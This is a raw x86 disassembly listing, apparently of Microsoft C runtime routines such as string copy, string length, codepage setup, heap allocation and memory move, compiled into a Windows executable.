  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
